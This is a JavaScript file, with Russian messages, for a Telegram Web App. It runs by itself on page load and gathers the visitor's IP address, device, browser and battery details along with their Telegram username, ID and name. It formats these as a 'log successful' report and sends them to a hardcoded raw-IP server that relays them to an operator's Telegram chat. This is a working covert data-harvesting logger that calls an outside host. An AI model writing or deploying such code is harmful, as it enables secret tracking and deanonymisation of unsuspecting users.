async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Ошибка получения IP адреса:', error);
        return 'неизвестно';
    }
}

function getUserAgent() {
    return navigator.userAgent || 'неизвестно';
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
}

function getOSName() {
    return navigator.platform || 'неизвестно';
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Ошибка получения процента заряда батареи:', error);
        return 'неизвестно';
    }
}

function getBrowserInfo() {
    return {
        name: navigator.appName || 'неизвестно',
        version: navigator.appVersion || 'неизвестно',
        engine: navigator.product || 'неизвестно'
    };
}

async function sendDataToTelegram() {
    let tg = window.Telegram.WebApp;
    const chatId = tg.initDataUnsafe.start_param;

    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    const userInfo = tg.initDataUnsafe.user || {};
    const username = userInfo.username ? `@${userInfo.username}` : 'неизвестно';
    const userId = userInfo.id || 'неизвестно';
    const firstName = userInfo.first_name || 'неизвестно';
    const lastName = userInfo.last_name || 'неизвестно';
    const languageCode = userInfo.language_code || 'неизвестно';
    const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';

    const message = `
<b>✨ Лог успешен!</b>

<b>🔍 Информация об аккаунте:</b>
├ Тэг: ${username}
├ Айди: <code>${userId}</code>
├ Имя: <code>${firstName}</code>
├ Фамилия: <code>${lastName}</code>
├ Язык: <code>${languageCode}</code>
└ Можно писать в ЛС: <code>${allowsWriteToPm}</code>

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>неизвестно</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    // Отправка данных на сервер
    try {
        const response = await fetch('http://31.177.109.160:3000/send-to-telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ chatId, message })
        });
        if (response.ok) {
            console.log('Данные успешно отправлены на сервер');
        } else {
            console.error('Ошибка при отправке на сервер');
        }
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

sendDataToTelegram();